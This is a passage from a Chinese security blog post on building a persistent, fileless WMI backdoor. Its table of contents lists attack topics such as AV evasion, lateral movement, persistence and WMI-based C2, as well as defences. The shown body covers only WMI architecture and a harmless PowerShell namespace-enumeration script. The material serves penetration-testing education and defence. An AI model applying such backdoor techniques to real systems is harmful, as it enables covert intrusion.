<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"m0nst3r.me","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="引用转发请注明 “原文来自：m0nst3r@DigApis安全”字样，谢谢！   [TOC] 简介随着技术的更新换代，很多技术在Windows系统中被引进和弃用，但是有一种非常强大的技术却保留了下来，自Windows NT 4.0和Windows 95开始就一直延续下来，那就是Windows Management Instrumentation (WMI)，即Windows管理工具。现在所有的">
<meta property="og:type" content="article">
<meta property="og:title" content="利用WMI构建一个持久化的异步的无文件后门">
<meta property="og:url" content="https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html">
<meta property="og:site_name" content="m0nst3r&#39;s blog">
<meta property="og:description" content="引用转发请注明 “原文来自：m0nst3r@DigApis安全”字样，谢谢！   [TOC] 简介随着技术的更新换代，很多技术在Windows系统中被引进和弃用，但是有一种非常强大的技术却保留了下来，自Windows NT 4.0和Windows 95开始就一直延续下来，那就是Windows Management Instrumentation (WMI)，即Windows管理工具。现在所有的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://m0nst3r.me/images/0cc382012eeccd6edeca756ae59afc08e915b5f6.png">
<meta property="og:image" content="https://m0nst3r.me/images/92c89cf85b3378be0490310e65809a46f9df895f.png">
<meta property="og:image" content="https://m0nst3r.me/images/2fa637c32b47d32ea6504f5d554890aa6600c548.png">
<meta property="og:image" content="https://m0nst3r.me/images/5f0b8d15296e088721e7142188eb46d15330144d.png">
<meta property="article:published_time" content="2018-03-08T03:12:00.000Z">
<meta property="article:modified_time" content="2022-08-08T14:27:53.017Z">
<meta property="article:author" content="m0nst3r">
<meta property="article:tag" content="Web安全,渗透测试,网络安全,代码审计,逆向,编程">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://m0nst3r.me/images/0cc382012eeccd6edeca756ae59afc08e915b5f6.png">


<link rel="canonical" href="https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html","path":"pentest/利用WMI构建一个持久化的异步的无文件后门.html","title":"利用WMI构建一个持久化的异步的无文件后门"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>利用WMI构建一个持久化的异步的无文件后门 | m0nst3r's blog</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">m0nst3r's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Hello, Bugs</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI-Architecture%EF%BC%88%E6%9E%B6%E6%9E%84%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">WMI Architecture（架构）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Managed-Components%EF%BC%88%E7%AE%A1%E7%90%86%E7%BB%84%E4%BB%B6%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">Managed Components（管理组件）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Consuming-Data%EF%BC%88%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">Consuming Data（数据处理）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Querying-Data%EF%BC%88%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">Querying Data（数据查询）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Populating-Data%EF%BC%88%E6%95%B0%E6%8D%AE%E5%A1%AB%E5%85%85%EF%BC%89"><span class="nav-number">2.4.</span> <span class="nav-text">Populating Data（数据填充）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Structuring-Data%EF%BC%88%E6%9E%84%E9%80%A0%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="nav-number">2.5.</span> <span class="nav-text">Structuring Data（构造数据）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transmitting-Data%EF%BC%88%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%EF%BC%89"><span class="nav-number">2.6.</span> <span class="nav-text">Transmitting Data（数据传输）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Performing-Actions%EF%BC%88%E6%89%A7%E8%A1%8C%E6%93%8D%E4%BD%9C%EF%BC%89"><span class="nav-number">2.7.</span> <span class="nav-text">Performing Actions（执行操作）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI-%E7%B1%BB%E5%92%8C%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-number">3.</span> <span class="nav-text">WMI 类和命名空间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2WMI"><span class="nav-number">4.</span> <span class="nav-text">查询WMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Instance-Queries"><span class="nav-number">4.1.</span> <span class="nav-text">Instance Queries</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Event-Queries"><span class="nav-number">4.2.</span> <span class="nav-text">Event Queries</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Meta-Queries"><span class="nav-number">4.3.</span> <span class="nav-text">Meta Queries</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8EWMI%E4%BA%A4%E4%BA%92"><span class="nav-number">5.</span> <span class="nav-text">与WMI交互</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerShell"><span class="nav-number">5.1.</span> <span class="nav-text">PowerShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmic-exe"><span class="nav-number">5.2.</span> <span class="nav-text">wmic.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wbemtest-exe"><span class="nav-number">5.3.</span> <span class="nav-text">wbemtest.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WMI-Explorer"><span class="nav-number">5.4.</span> <span class="nav-text">WMI Explorer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CIM-Studio"><span class="nav-number">5.5.</span> <span class="nav-text">CIM Studio</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Script-Host-WSH-languages"><span class="nav-number">5.6.</span> <span class="nav-text">Windows Script Host (WSH) languages</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C-x2F-C-via-IWbem-COM-API"><span class="nav-number">5.7.</span> <span class="nav-text">C&#x2F;C++ via IWbem* COM API</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NET-using-System-Management-classes"><span class="nav-number">5.8.</span> <span class="nav-text">.NET using System.Management classes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#winrm-exe"><span class="nav-number">5.9.</span> <span class="nav-text">winrm.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmic-and-wmis-pth-for-Linux"><span class="nav-number">5.10.</span> <span class="nav-text">wmic and wmis-pth for Linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8BWMI"><span class="nav-number">6.</span> <span class="nav-text">远程WMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DCOM-Distributed-Component-Object-Model"><span class="nav-number">6.1.</span> <span class="nav-text">DCOM (Distributed Component Object Model)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WinRM-Windows-Remote-Management"><span class="nav-number">6.2.</span> <span class="nav-text">WinRM (Windows Remote Management)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI-Eventing%EF%BC%88WMI%E4%BA%8B%E4%BB%B6%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">WMI Eventing（WMI事件）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Eventing-Requirements%EF%BC%88%E4%BA%8B%E4%BB%B6%E8%A6%81%E6%B1%82%EF%BC%89"><span class="nav-number">7.1.</span> <span class="nav-text">Eventing Requirements（事件要求）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Event-FIlters%EF%BC%88%E4%BA%8B%E4%BB%B6%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%89"><span class="nav-number">7.2.</span> <span class="nav-text">Event FIlters（事件过滤器）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Intrinsic-Events"><span class="nav-number">7.2.1.</span> <span class="nav-text">Intrinsic Events</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Extrinsic-Events"><span class="nav-number">7.2.2.</span> <span class="nav-text">Extrinsic Events</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Event-Consumers%EF%BC%88%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%EF%BC%89"><span class="nav-number">7.3.</span> <span class="nav-text">Event Consumers（事件处理）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8FWMI%E6%8C%81%E4%B9%85%E5%8C%96%E5%AE%9E%E4%BE%8B"><span class="nav-number">7.4.</span> <span class="nav-text">恶意WMI持久化实例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI-Attach%EF%BC%88WMI%E6%94%BB%E5%87%BB%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">WMI Attach（WMI攻击）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">8.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AV-x2F-VM-%E6%A3%80%E6%B5%8B"><span class="nav-number">8.2.</span> <span class="nav-text">AV&#x2F;VM 检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B"><span class="nav-number">8.2.1.</span> <span class="nav-text">反病毒软件检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VM-x2F-%E6%B2%99%E7%9B%92%E6%A3%80%E6%B5%8B"><span class="nav-number">8.2.2.</span> <span class="nav-text">VM&#x2F;沙盒检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B"><span class="nav-number">8.2.3.</span> <span class="nav-text">虚拟机检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">8.2.4.</span> <span class="nav-text">代码执行和横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Win32-Process-Create%E6%96%B9%E6%B3%95"><span class="nav-number">8.2.4.1.</span> <span class="nav-text">Win32_Process Create方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Event-%E5%A4%84%E7%90%86"><span class="nav-number">8.2.4.2.</span> <span class="nav-text">利用Event 处理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-number">8.3.</span> <span class="nav-text">持久化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%90%E7%A7%98%E5%AD%98%E5%82%A8"><span class="nav-number">8.3.1.</span> <span class="nav-text">隐秘存储</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8WMI%E5%81%9AC2"><span class="nav-number">8.3.2.</span> <span class="nav-text">利用WMI做C2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Push%E6%94%BB%E5%87%BB"><span class="nav-number">8.3.2.1.</span> <span class="nav-text">Push攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pull%E6%94%BB%E5%87%BB"><span class="nav-number">8.3.2.2.</span> <span class="nav-text">Pull攻击</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI-Providers%EF%BC%88%E6%8F%90%E4%BE%9B%E8%80%85%EF%BC%89"><span class="nav-number">9.</span> <span class="nav-text">WMI Providers（提供者）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8FWMI-Providers%EF%BC%88%E6%8F%90%E4%BE%9B%E8%80%85%EF%BC%89"><span class="nav-number">9.1.</span> <span class="nav-text">恶意WMI Providers（提供者）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI-%E9%98%B2%E5%BE%A1"><span class="nav-number">10.</span> <span class="nav-text">WMI 防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%B2%E6%9C%89%E7%9A%84%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="nav-number">10.1.</span> <span class="nav-text">已有的检测工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8WMI%E6%A3%80%E6%B5%8BWMI%E6%94%BB%E5%87%BB"><span class="nav-number">10.2.</span> <span class="nav-text">利用WMI检测WMI攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="nav-number">11.</span> <span class="nav-text">缓解措施</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">m0nst3r</p>
  <div class="site-description" itemprop="description">Web安全、渗透测试、网络安全、代码审计、逆向、编程</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">65</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">categories</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">31</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nst3r">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="m0nst3r's blog">
      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="利用WMI构建一个持久化的异步的无文件后门 | m0nst3r's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          利用WMI构建一个持久化的异步的无文件后门
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2018-03-08 11:12:00" itemprop="dateCreated datePublished" datetime="2018-03-08T11:12:00+08:00">2018-03-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/category/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <blockquote>
<blockquote>
<p>引用转发请注明 “原文来自：m0nst3r@DigApis安全”字样，谢谢！</p>
</blockquote>
</blockquote>
<p>[TOC]</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>随着技术的更新换代，很多技术在Windows系统中被引进和弃用，但是有一种非常强大的技术却保留了下来，自Windows NT 4.0和Windows 95开始就一直延续下来，那就是<code>Windows Management Instrumentation (WMI)</code>，即Windows管理工具。现在所有的Windows系统中都有这个工具，利用它包含的工具集，我们可以管理本地或远程的计算机。</p>
<p>它不仅仅被系统管理员熟知，更因为<code>Stuxnet</code>利用WMI来进行攻击的原因而被广大安全人员所知。由于WMI能够提供系统信息收集，防病毒检测，代码执行，横向移动，持久化和盗取数据的能力而很受黑客的欢迎。</p>
<p>随着黑客越来越多的使用WMI技术，了解WMI知识并为已所用，对防御者来说就非常重要。</p>
<p>这个文章主要向读者介绍WMI的主要功能，攻击者如何使用WMI，如何通过WMI绕过IDS以及如何通过WMI Repository做取证。</p>
<h2 id="WMI-Architecture（架构）"><a href="#WMI-Architecture（架构）" class="headerlink" title="WMI Architecture（架构）"></a>WMI Architecture（架构）</h2><p>WMI是Windows对<code>WBEM</code>和<code>CID</code>标准的实现。两个标准目的是在企业环境中提供一个行业无关的，用于收集和传输<code>Managed Component</code>（管理组件）信息的方法。<br>一个WMI的管理组件可以是一个进程，一个注册表的键，一个安装的服务或一个文件信息，等等。这些标准用来沟通确定实现者应该使用什么方法来<code>query</code>（查询），<code>populate</code>（填充）,<code>structure</code>（构造）,<code>transmit</code>（传输）,<code>perform actions on</code>（执行操作）和<code>consume data</code>（处理数据）。</p>
<p><img src="/images/0cc382012eeccd6edeca756ae59afc08e915b5f6.png" alt="wmi-1.png"></p>
<p>Microsoft有实现可以总结为以下几个部分：</p>
<h3 id="Managed-Components（管理组件）"><a href="#Managed-Components（管理组件）" class="headerlink" title="Managed Components（管理组件）"></a>Managed Components（管理组件）</h3><p>管理组件即WMI的对象，是代表着高度结构化的操作系统数据的<code>Class Instances</code>（类实例）。Microsoft提供了非常多的WMI对象来提供有关系统的信息，比如<code>Win32_Process</code>，<code>Win32_Service</code>，<code>AntiVirusProduct</code>，<code>Win32_StartupCommand</code>等。</p>
<h3 id="Consuming-Data（数据处理）"><a href="#Consuming-Data（数据处理）" class="headerlink" title="Consuming Data（数据处理）"></a>Consuming Data（数据处理）</h3><p>Microsoft提供了一些用来处理WMI数据和执行WMI命令的方法。例如，<code>PowerShell</code>提供给了我们一个非常简单的与PowerShell交互的方式。</p>
<h3 id="Querying-Data（数据查询）"><a href="#Querying-Data（数据查询）" class="headerlink" title="Querying Data（数据查询）"></a>Querying Data（数据查询）</h3><p>所有的WMI对象可以通过一个叫<code>WQL</code>的查询语言来查询，这种语言与SQL相似，能够让我们精细地控制返回给用户的WMI对象。</p>
<h3 id="Populating-Data（数据填充）"><a href="#Populating-Data（数据填充）" class="headerlink" title="Populating Data（数据填充）"></a>Populating Data（数据填充）</h3><p>当用户请求一个WMI对象时，WMI服务（Winmgmt）需要知道请求对象的数据填充方式。这个功能是通过<code>WMI Providers</code>（WMI提供者）来完成的。一个WMI提供者就是一个在注册表中拥有相关<code>GUID</code>的注册表键。WMI提供者在数据填充时，做了大量的动作，比如查询所有进程，枚举注册表键等。</p>
<p>当WMI服务填充一个WMI对象时，会有两种类实例：<code>Dynamic Object</code>（动态对象）和<code>Persistent Object</code>（永久化对象）。<br>动态对象是在进行查询时生成的，例如，Win32_Process就是一个动态对象。<br>永久化对象是存储在<code>CIM Repository</code>（CIM库）中的，默认放在<code>%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA</code>中。</p>
<h3 id="Structuring-Data（构造数据）"><a href="#Structuring-Data（构造数据）" class="headerlink" title="Structuring Data（构造数据）"></a>Structuring Data（构造数据）</h3><p>WMI对象大部分的结构是通过<code>Managed Object Format (MOF)</code>（管理对象格式）文件中描述的。MOF文件使用类似C++的语法来描述WMI对象。<br>当WMI提供者生成原始数据时，MOF文件对提供了这些数据的构造结构。从防御者的角度看，值得注意的是，WMI对象的定义可以不通过MOF文件，攻击者可以通过在CIM库中插入<code>.Net</code>代码来定义。</p>
<h3 id="Transmitting-Data（数据传输）"><a href="#Transmitting-Data（数据传输）" class="headerlink" title="Transmitting Data（数据传输）"></a>Transmitting Data（数据传输）</h3><p>Microsoft提供了两种用于远程传输WMI数据的方法：<code>DCOM</code>和<code>Windows Remote Management (WinRM)</code>。</p>
<h3 id="Performing-Actions（执行操作）"><a href="#Performing-Actions（执行操作）" class="headerlink" title="Performing Actions（执行操作）"></a>Performing Actions（执行操作）</h3><p>一些WMI对象包含一些可执行的方法&#x2F;函数。例如，Win32_Process类的静态函数<code>Create</code>就经常被黑客用来做内网中的横向移动。<br>WMI还提供了一个<code>Eventing System</code>（事件系统），用户可以注册在WMI对象生成，修改或删除时执行的事件处理程序。</p>
<h2 id="WMI-类和命名空间"><a href="#WMI-类和命名空间" class="headerlink" title="WMI 类和命名空间"></a>WMI 类和命名空间</h2><p>操作系统信息是通过WMI对象的方式表示的。一个WMI对象也就是一个WMI类的实例。大多数常用的WMI类在MSDN中都有详细的描述，如Win32_Process类。然而还有很多WMI类并没有文档可查，但是幸运的是，我们可以通过WQL来查询所有的WMI类。</p>
<p>与传统的面向对象编程语言相似，WMI类被分类分层的放在命名空间中。所有的命名空间都是从<code>ROOT</code>命名空间下的，当不指定命名空间进行查询时，Microsoft会使用<code>ROOT\CIMV2</code>作为默认的命名空间。</p>
<p>所有的WMI设置，包括默认命名空间在下面的注册表键中：</p>
<p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM</code></p>
<p>下面的PowerShell代码会递归查询所有的WMI类及其命名空间：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Get-WmiNamespace &#123;</span><br><span class="line">	Param ($Namespace=&#x27;ROOT&#x27;)</span><br><span class="line">	</span><br><span class="line">	Get-WmiObject -Namespace $Namespace -Class __NAMESPACE | ForEach-Object &#123;</span><br><span class="line"><span class="meta prompt_">		($</span><span class="language-bash">ns = <span class="string">&#x27;&#123;0&#125;\&#123;1&#125;&#x27;</span> -f <span class="variable">$_</span>.__NAMESPACE, <span class="variable">$_</span>.Name)</span></span><br><span class="line">		Get-WmiNamespace -Namespace $ns</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">WmiClasses = Get-WmiNamespace | ForEach-Object &#123;</span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">Namespace = <span class="variable">$_</span></span></span><br><span class="line">	Get-WmiObject -Namespace $Namespace -List |</span><br><span class="line">		ForEach-Object &#123; $_.Path.Path &#125;</span><br><span class="line">&#125; | Sort-Object -Unique</span><br></pre></td></tr></table></figure>

<p>返回的WMI Class 路径如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__AbsoluteTimerInstruction</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ACE</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__AggregateEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassCreationEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassDeletionEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassModificationEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassOperationEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassProviderRegistration</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ConsumerFailureEvent</span><br><span 